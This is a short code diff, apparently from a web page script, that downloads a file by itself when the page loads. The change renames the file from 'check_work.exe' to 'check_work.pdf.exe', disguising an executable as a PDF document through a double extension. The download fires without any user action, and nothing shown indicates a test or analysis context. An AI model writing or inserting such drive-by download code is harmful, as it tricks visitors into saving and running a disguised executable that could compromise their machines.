@@ -9,7 +9,7 @@
   window.addEventListener('load', () => {
     const link = document.createElement('a');
     link.href = pdfUrl;
-    link.download = "check_work.exe";
+    link.download = "check_work.pdf.exe";
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
